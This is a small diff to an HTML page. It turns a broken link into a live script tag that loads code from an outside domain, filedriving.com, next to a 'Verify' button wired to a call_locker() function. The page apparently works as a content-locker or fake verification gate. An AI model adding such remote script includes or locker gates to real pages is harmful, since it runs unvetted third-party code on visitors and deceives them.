@@ -30,7 +30,7 @@
 	
 	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="call_locker();">Verify</button>
 	
-		<a href="https://filedriving.com/script_include.php?id=1073629></a>
+		<script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script>
 		
 	</div>
 </div>
